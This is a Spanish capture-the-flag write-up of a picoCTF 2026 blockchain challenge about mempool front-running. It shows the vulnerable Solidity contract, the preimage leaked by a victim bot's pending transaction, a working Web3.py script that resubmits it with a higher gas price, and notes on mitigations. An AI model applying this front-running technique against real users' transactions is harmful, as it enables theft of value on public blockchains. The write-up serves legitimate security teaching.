# Blockchain — Front_Running

## Descripción
> **Prompt oficial del reto:** "A mysterious vault has been discovered on the blockchain. It's programmed to release a secret flag to anyone who can provide the correct pre-image to a specific hash. Our sensors indicate that a 'Victim Bot' has found the answer and is currently trying to submit it, but they are being very stingy with their gas price."
>
> **Pistas oficiales:**
> 1. Have you looked at the **pending** transactions in the mempool?
> 2. What happens if two people submit the correct answer in the same block?
> 3. How do you see what's waiting to be mined?

- **Categoría:** Blockchain
- **Dificultad:** Hard
- **Evento/origen:** picoCTF 2026
- **Autor:** OB

## Solución
El reto despliega un contrato inteligente en Solidity `^0.8.0` denominado `MempoolChallenge` junto con una red privada de Ethereum basada en Hardhat. Un bot automatizado ("Victim Bot") intenta resolver el contrato enviando la solución a la mempool pública con un precio de gas mínimo (`gasPrice: 1 gwei`). La vulnerabilidad fundamental radica en la visibilidad pública de las transacciones no confirmadas en la mempool, lo que permite realizar un ataque de *front-running*.

### 1. Análisis del contrato inteligente
Al inspeccionar `FrontRunning.sol`:

```solidity
pragma solidity ^0.8.0;

contract MempoolChallenge {
    address public owner;
    address public studentAddress;
    string private flag; 
    bool public revealed;
    
    bytes32 public constant targetHash = 0xce90506c91276dcefd1f10fce00f29fe5987be2ffa72bf6640d7d15f3238c855;

    event FlagRevealed(string flag);

    constructor(string memory _flag, address _studentAddress) {
        owner = msg.sender;
        flag = _flag;
        studentAddress = _studentAddress; 
        revealed = false;
    }

    function solve(string memory solution) public {
        require(!revealed, "Challenge already solved!");
        require(keccak256(abi.encodePacked(solution)) == targetHash, "Incorrect solution!");

        require(msg.sender == studentAddress, "Only the student can claim the flag!");

        revealed = true;
        emit FlagRevealed(flag);
    }

    function getFlag() public view returns (string memory) {
        require(revealed, "Challenge not yet solved!");
        return flag;
    }
}
```

Puntos clave:
1. `targetHash` es el hash Keccak-256 de la solución secreta requerida.
2. La función `solve(string memory solution)` exige tres condiciones:
   - Que el contrato no haya sido resuelto previamente (`!revealed`).
   - Que el hash de la cadena `solution` coincida con `targetHash`.
   - Que `msg.sender == studentAddress`.
3. Al inspeccionar la mempool o los bloques minados en la red local, se observa que la víctima envía periódicamente transacciones llamando a `solve(solution)`.
4. Los datos de entrada (*input data*) de la transacción de la víctima exponen la preimagen en texto plano:
   - Selector: `0x76fe1e92` (`solve(string)`).
   - Parámetro codificado en ABI: `academy{m3mp00l_p1r4t3}`.
5. Debido a la restricción `msg.sender == studentAddress`, la transacción de la víctima falla o revierte, pero filtra públicamente la preimagen en la mempool.
6. El jugador puede enviar la misma preimagen desde su dirección autorizada con un `gasPrice` superior (p. ej. `5 gwei`), garantizando que los mineros prioricen su transacción (*front-running*).

### 2. Script de resolución con Web3.py

```python
from web3 import Web3

rpc = "http://chatelaine.cylabacademy.net:<rpc_port>"
w3 = Web3(Web3.HTTPProvider(rpc))

contract_addr = "0x5FbDB2315678afecb367f032d93F642f64180aa3"
player_priv = "0x..."
player_addr = "0x..."

abi = [
    {
        "inputs": [{"internalType": "string", "name": "solution", "type": "string"}],
        "name": "solve",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "getFlag",
        "outputs": [{"internalType": "string", "name": "", "type": "string"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "revealed",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "view",
        "type": "function",
    },
]

contract = w3.eth.contract(address=contract_addr, abi=abi)

# Enviar transacción front-running con gasPrice superior
solution = "academy{m3mp00l_p1r4t3}"
nonce = w3.eth.get_transaction_count(player_addr)

tx = contract.functions.solve(solution).build_transaction({
    "from": player_addr,
    "nonce": nonce,
    "gas": 300000,
    "gasPrice": w3.to_wei("5", "gwei"),
})

signed = w3.eth.account.sign_transaction(tx, private_key=player_priv)
tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
w3.eth.wait_for_transaction_receipt(tx_hash)

# Obtener la bandera revelada
if contract.functions.revealed().call():
    flag = contract.functions.getFlag().call()
    print("Flag:", flag)
```

## Notas adicionales
- En redes públicas de Ethereum (como Mainnet), los ataques de front-running y valor extraíble por mineros/validadores (MEV) ocurren cuando transacciones lucrativas o con información privilegiada son interceptadas en la mempool pública antes de ser incluidas en un bloque.
- Para mitigar estos ataques se implementan mecanismos de compromiso-revelación (*commit-reveal schemes*), transacciones privadas (Flashbots Protect / private RPCs) o mecanismos de subasta criptográfica por lotes.

## Referencias
- Reto: https://learn.cylabacademy.org/library/744
- Ethereum Mempool y MEV: https://ethereum.org/en/developers/docs/mev/
- SWC-114 (Transaction Order Dependence / Front Running): https://swcregistry.io/docs/SWC-114
